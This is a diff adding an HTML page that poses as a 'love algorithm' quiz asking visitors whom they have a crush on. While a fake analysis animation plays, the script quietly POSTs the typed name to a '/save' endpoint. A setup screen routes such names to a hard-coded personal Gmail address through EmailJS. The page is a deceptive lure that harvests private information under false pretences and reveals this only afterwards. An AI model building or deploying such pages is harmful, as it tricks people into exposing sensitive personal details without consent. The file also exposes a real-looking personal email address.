@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Does your crush like you back? 💘</title>
+  <!-- <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script> -->
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #fff0f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 8px 40px rgba(212, 83, 126, 0.15);
+      padding: 2.5rem 2rem;
+      max-width: 440px;
+      width: 100%;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .emoji-big { font-size: 52px; display: block; margin-bottom: 1rem; }
+
+    h1 { font-size: 22px; font-weight: 600; color: #2c2c2c; margin-bottom: 0.5rem; }
+    .subtitle { font-size: 14px; color: #888; margin-bottom: 1.8rem; line-height: 1.6; }
+
+    input[type="text"] {
+      width: 100%; padding: 13px 16px; font-size: 16px;
+      border-radius: 12px; border: 2px solid #ED93B1;
+      background: #fff; color: #2c2c2c; margin-bottom: 1rem;
+      outline: none; transition: border-color 0.2s;
+    }
+    input[type="text"]:focus { border-color: #993556; }
+    input[type="text"]::placeholder { color: #ccc; }
+
+    .btn {
+      width: 100%; padding: 14px; font-size: 15px; font-weight: 600;
+      cursor: pointer; background: linear-gradient(135deg, #D4537E, #993556);
+      color: #fff; border: none; border-radius: 12px;
+      transition: opacity 0.2s, transform 0.1s;
+    }
+    .btn:hover { opacity: 0.9; }
+    .btn:active { transform: scale(0.98); }
+
+    .progress-wrap { background: #f5e0e8; border-radius: 99px; height: 8px; overflow: hidden; margin: 1rem 0; }
+    .progress-bar { height: 100%; background: linear-gradient(90deg, #ED93B1, #D4537E); border-radius: 99px; width: 0%; transition: width 0.35s ease; }
+
+    .steps { text-align: left; margin: 1rem 0; }
+    .step-row { display: flex; align-items: center; gap: 10px; padding: 5px 0; font-size: 13px; color: #888; }
+    .dot { width: 18px; height: 18px; border-radius: 50%; border: 1.5px solid #ccc; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 10px; transition: all 0.3s; }
+    .dot.active { border-color: #D4537E; color: #D4537E; animation: pulse 0.9s infinite; }
+    .dot.done { background: #D4537E; border-color: #D4537E; color: #fff; font-size: 11px; }
+
+    @keyframes pulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(212,83,126,0.3); }
+      50%       { box-shadow: 0 0 0 5px rgba(212,83,126,0); }
+    }
+
+    .prank-banner { background: #fbeaf0; border: 2px solid #ED93B1; border-radius: 14px; padding: 1.2rem 1.5rem; margin-bottom: 1rem; animation: popIn 0.5s cubic-bezier(0.175,0.885,0.32,1.275); }
+    @keyframes popIn { from { transform: scale(0.7); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .prank-title { font-size: 26px; font-weight: 700; color: #993556; }
+    .prank-name  { font-size: 16px; color: #D4537E; margin: 0.4rem 0; }
+    .prank-sub   { font-size: 12px; color: #aa4464; opacity: 0.85; }
+
+    .notify-box { background: #f9f9f9; border-radius: 10px; padding: 0.75rem 1rem; font-size: 12px; color: #888; display: flex; align-items: center; gap: 8px; margin-top: 0.75rem; text-align: left; }
+
+    .confetti-piece { position: absolute; border-radius: 2px; animation: fall linear forwards; pointer-events: none; }
+    @keyframes fall { from { transform: translateY(-20px) rotate(0deg); opacity: 1; } to { transform: translateY(520px) rotate(720deg); opacity: 0; } }
+
+    /* ── Setup / config screen ── */
+    .setup-card { background: #fff8fb; border: 1.5px solid #f5c0d1; border-radius: 16px; padding: 1.5rem; text-align: left; margin-bottom: 1rem; }
+    .setup-card h2 { font-size: 15px; font-weight: 600; color: #993556; margin-bottom: 0.75rem; display: flex; align-items: center; gap: 6px; }
+    .setup-card p { font-size: 13px; color: #666; line-height: 1.7; margin-bottom: 0.5rem; }
+    .setup-card a { color: #D4537E; text-decoration: none; font-weight: 600; }
+    .setup-card a:hover { text-decoration: underline; }
+    .setup-card code { background: #fff; border: 1px solid #f5c0d1; padding: 2px 6px; border-radius: 5px; font-size: 12px; color: #D4537E; font-family: monospace; }
+    .field-group { margin-top: 0.75rem; }
+    .field-group label { font-size: 12px; font-weight: 600; color: #993556; display: block; margin-bottom: 4px; }
+    .field-group input { width: 100%; padding: 9px 12px; font-size: 13px; border-radius: 10px; border: 1.5px solid #ED93B1; background: #fff; color: #2c2c2c; outline: none; }
+    .btn-save { width: 100%; padding: 12px; font-size: 14px; font-weight: 600; cursor: pointer; background: linear-gradient(135deg, #D4537E, #993556); color: #fff; border: none; border-radius: 12px; margin-top: 1rem; }
+    .btn-save:hover { opacity: 0.9; }
+
+    .status-badge { display: inline-flex; align-items: center; gap: 5px; font-size: 12px; padding: 4px 10px; border-radius: 20px; margin-top: 0.5rem; }
+    .status-badge.ok  { background: #eafaf0; color: #2d7a4e; }
+    .status-badge.err { background: #fbeaf0; color: #993556; }
+
+    .hint { font-size: 11px; color: #bbb; margin-top: 1rem; }
+
+    .owner-tab { position: fixed; top: 12px; right: 12px; background: #fff; border: 1px solid #ED93B1; border-radius: 8px; padding: 5px 12px; font-size: 11px; color: #D4537E; cursor: pointer; font-weight: 600; z-index: 99; }
+
+    .hidden { display: none !important; }
+  </style>
+</head>
+<body>
+
+<!-- ─── OWNER SETUP BUTTON (hidden on target's screen) ─── -->
+<button class="owner-tab" id="ownerBtn" onclick="toggleSetup()">⚙️ Setup</button>
+
+<div class="card" id="mainCard">
+
+  <!-- ════════════ SETUP SCREEN ════════════ -->
+  <div id="screenSetup">
+    <span class="emoji-big">📧</span>
+    <h1>Email notification setup</h1>
+    <p class="subtitle">One-time setup using EmailJS (free). You'll get an email at <strong>rbagda098@gmail.com</strong> whenever someone is pranked.</p>
+
+    <div class="setup-card">
+      <h2>📋 Steps to get your keys</h2>
+      <p>1. Go to <a href="https://www.emailjs.com/" target="_blank">emailjs.com</a> → sign up free (use your Gmail).</p>
+      <p>2. Click <strong>Add New Service</strong> → choose <strong>Gmail</strong> → connect your account → save. Copy the <strong>Service ID</strong>.</p>
+      <p>3. Go to <strong>Email Templates</strong> → <strong>Create New Template</strong>.</p>
+      <p>4. In the template body, add: <code>{{crush_name}}</code> — that's where the name appears.</p>
+      <p>5. Set <strong>To Email</strong> = <code>rbagda098@gmail.com</code> → save. Copy the <strong>Template ID</strong>.</p>
+      <p>6. Go to <strong>Account → API Keys</strong> → copy your <strong>Public Key</strong>.</p>
+    </div>
+
+    <div class="setup-card">
+      <h2>🔑 Paste your keys here</h2>
+      <div class="field-group">
+        <label>Public Key</label>
+        <input type="text" id="inputPublicKey" placeholder="e.g. aBcDeFgHiJkLmNoP" />
+      </div>
+      <div class="field-group">
+        <label>Service ID</label>
+        <input type="text" id="inputServiceId" placeholder="e.g. service_xxxxxxx" />
+      </div>
+      <div class="field-group">
+        <label>Template ID</label>
+        <input type="text" id="inputTemplateId" placeholder="e.g. template_xxxxxxx" />
+      </div>
+      <button class="btn-save" onclick="saveConfig()">💾 Save &amp; test</button>
+      <div id="statusBadge" class="hidden"></div>
+    </div>
+
+    <button class="btn" onclick="goToPrank()">👁 Preview prank page →</button>
+    <p class="hint">After setup, share the link with your target.</p>
+  </div>
+
+  <!-- ════════════ PRANK SCREEN ════════════ -->
+  <div id="screenPrank" class="hidden">
+
+    <!-- Form -->
+    <div id="viewForm">
+      <span class="emoji-big">💘</span>
+      <h1>Does your crush like's you ?</h1>
+      <p class="subtitle">Enter their name and our <em>advanced love algorithm</em> will reveal the truth ✨</p>
+      <input type="text" id="crushName" placeholder="Enter their name..." maxlength="40" />
+      <button class="btn" onclick="startAnalysis()">Find out now 💕</button>
+      <p class="hint">100% accurate &nbsp;·&nbsp; totally real &nbsp;·&nbsp; zero cringe</p>
+    </div>
+
+    <!-- Loading -->
+    <div id="viewLoading" class="hidden">
+      <span class="emoji-big">🔮</span>
+      <h1>Analyzing compatibility…</h1>
+      <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+      <div class="steps" id="stepsList"></div>
+    </div>
+
+    <!-- Result -->
+    <div id="viewResult" class="hidden">
+      <div style="font-size:52px;margin-bottom:0.75rem">😂</div>
+      <div class="prank-banner">
+        <div class="prank-title">YOU'VE BEEN PRANKED!</div>
+        <div class="prank-name" id="prankNameDisplay"></div>
+        <div class="prank-sub">There is no love algorithm. But your secret is out now 👀</div>
+      </div>
+      <div class="notify-box">
+        📧 Your crush's name has been secretly sent to your friend's email!
+      </div>
+      <button class="btn" style="margin-top:1.2rem" onclick="resetPrank()">Prank someone else 😈</button>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  /* ═══════════════════════════════════════════════
+     CONFIG — fill these in after EmailJS setup,
+     OR leave blank and use the Setup UI above.
+  ═══════════════════════════════════════════════ */
+  const CONFIG = {
+    publicKey  : '',   // e.g. 'aBcDeFgHiJkLmNoP'
+    serviceId  : '',   // e.g. 'service_abc123'
+    templateId : '',   // e.g. 'template_abc123'
+    toEmail    : 'rbagda098@gmail.com'
+  };
+
+  /* ─── runtime state ─── */
+  let cfg       = { ...CONFIG };
+  let crushedName = '';
+  let setupOpen = false;
+
+  const STEPS = [
+    'Scanning crush\'s social energy…',
+    'Cross-referencing love frequencies…',
+    'Analyzing star sign compatibility…',
+    'Decoding secret feelings…',
+    'Consulting the universe…',
+    'Finalizing results…'
+  ];
+  const COLORS = ['#ED93B1','#D4537E','#993556','#F0997B','#FAC775','#5DCAA5','#AFA9EC'];
+
+  /* ─── init ─── */
+  function init() {
+    loadStoredConfig();
+    const params = new URLSearchParams(window.location.search);
+    /* If ?prank=1 is in URL, go straight to prank screen */
+    if (params.get('prank') === '1' || cfg.publicKey) {
+      goToPrank();
+    } else {
+      showSetup();
+    }
+  }
+
+  function loadStoredConfig() {
+    try {
+      const stored = JSON.parse(localStorage.getItem('prank_cfg') || '{}');
+      if (stored.publicKey) cfg = { ...cfg, ...stored };
+    } catch(e) {}
+  }
+
+  function showSetup() {
+    setupOpen = true;
+    document.getElementById('screenSetup').classList.remove('hidden');
+    document.getElementById('screenPrank').classList.add('hidden');
+    document.getElementById('ownerBtn').classList.add('hidden');
+    /* Pre-fill saved values */
+    if (cfg.publicKey)  document.getElementById('inputPublicKey').value  = cfg.publicKey;
+    if (cfg.serviceId)  document.getElementById('inputServiceId').value  = cfg.serviceId;
+    if (cfg.templateId) document.getElementById('inputTemplateId').value = cfg.templateId;
+  }
+
+  function goToPrank() {
+    setupOpen = false;
+    document.getElementById('screenSetup').classList.add('hidden');
+    document.getElementById('screenPrank').classList.remove('hidden');
+    document.getElementById('ownerBtn').classList.remove('hidden');
+  }
+
+  function toggleSetup() {
+    if (setupOpen) { goToPrank(); } else { showSetup(); }
+  }
+
+  /* ─── save & test config ─── */
+  function saveConfig() {
+    const pk = document.getElementById('inputPublicKey').value.trim();
+    const si = document.getElementById('inputServiceId').value.trim();
+    const ti = document.getElementById('inputTemplateId').value.trim();
+    const badge = document.getElementById('statusBadge');
+
+    if (!pk || !si || !ti) {
+      showBadge('err', '❌ All three fields are required.');
+      return;
+    }
+
+    cfg.publicKey  = pk;
+    cfg.serviceId  = si;
+    cfg.templateId = ti;
+
+    /* Save to localStorage for convenience */
+    try { localStorage.setItem('prank_cfg', JSON.stringify({ publicKey: pk, serviceId: si, templateId: ti })); } catch(e) {}
+
+    /* Init EmailJS and send a test email */
+    emailjs.init({ publicKey: pk });
+
+    showBadge('ok', '⏳ Sending test email…');
+
+    emailjs.send(si, ti, {
+      crush_name : '🧪 Test — setup successful!',
+      to_email   : cfg.toEmail
+    }).then(() => {
+      showBadge('ok', '✅ Test email sent to ' + cfg.toEmail + '! Check your inbox.');
+    }).catch(err => {
+      showBadge('err', '❌ Error: ' + (err.text || JSON.stringify(err)));
+    });
+  }
+
+  function showBadge(type, msg) {
+    const badge = document.getElementById('statusBadge');
+    badge.className = 'status-badge ' + type;
+    badge.textContent = msg;
+    badge.classList.remove('hidden');
+  }
+
+  /* ─── prank logic ─── */
+  function startAnalysis() {
+    const name = document.getElementById('crushName').value.trim();
+    if (!name) { document.getElementById('crushName').focus(); return; }
+    crushedName = name;
+
+    document.getElementById('viewForm').classList.add('hidden');
+    document.getElementById('viewLoading').classList.remove('hidden');
+
+    const list = document.getElementById('stepsList');
+    list.innerHTML = STEPS.map((s, i) =>
+      `<div class="step-row">
+         <div class="dot" id="dot${i}"></div>
+         <span>${s}</span>
+       </div>`
+    ).join('');
+
+    let cur = 0;
+    const bar = document.getElementById('progressBar');
+
+    function tick() {
+      if (cur < STEPS.length) {
+        if (cur > 0) { const p = document.getElementById('dot'+(cur-1)); p.className='dot done'; p.innerHTML='✓'; }
+        const d = document.getElementById('dot'+cur); d.className='dot active'; d.innerHTML='●';
+        bar.style.width = Math.round(((cur+1)/STEPS.length)*88) + '%';
+        cur++;
+        setTimeout(tick, 620 + Math.random()*430);
+      } else {
+        const last = document.getElementById('dot'+(cur-1)); last.className='dot done'; last.innerHTML='✓';
+        bar.style.width = '100%';
+        setTimeout(showResult, 450);
+      }
+    }
+    tick();
+
+    sendEmail(name);
+  }
+
+ function sendEmail(name) {
+
+    fetch("/save", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            crush_name: name
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        console.log(data);
+    });
+
+}
+
+  function showResult() {
+    document.getElementById('viewLoading').classList.add('hidden');
+    document.getElementById('viewResult').classList.remove('hidden');
+    document.getElementById('prankNameDisplay').textContent =
+      '"' + crushedName + '" has been emailed to your friend 👀';
+    spawnConfetti();
+  }
+
+  function resetPrank() {
+    document.getElementById('crushName').value = '';
+    document.getElementById('viewResult').classList.add('hidden');
+    document.getElementById('viewForm').classList.remove('hidden');
+  }
+
+  /* ─── confetti ─── */
+  function spawnConfetti() {
+    const card = document.getElementById('mainCard');
+    for (let i = 0; i < 35; i++) {
+      const el = document.createElement('div');
+      el.className = 'confetti-piece';
+      el.style.cssText = [
+        'left:'+(Math.random()*100)+'%',
+        'top:0',
+        'background:'+COLORS[Math.floor(Math.random()*COLORS.length)],
+        'animation-duration:'+(1.3+Math.random()*1.5)+'s',
+        'animation-delay:'+(Math.random()*0.7)+'s',
+        'width:'+(5+Math.random()*8)+'px',
+        'height:'+(5+Math.random()*8)+'px',
+        'border-radius:'+(Math.random()>0.5?'50%':'2px')
+      ].join(';');
+      card.appendChild(el);
+      setTimeout(() => el.remove(), 3500);
+    }
+  }
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Enter' &&
+        !document.getElementById('screenPrank').classList.contains('hidden') &&
+        !document.getElementById('viewForm').classList.contains('hidden')) {
+      startAnalysis();
+    }
+  });
+
+  init();
+</script>
+</body>
+</html>
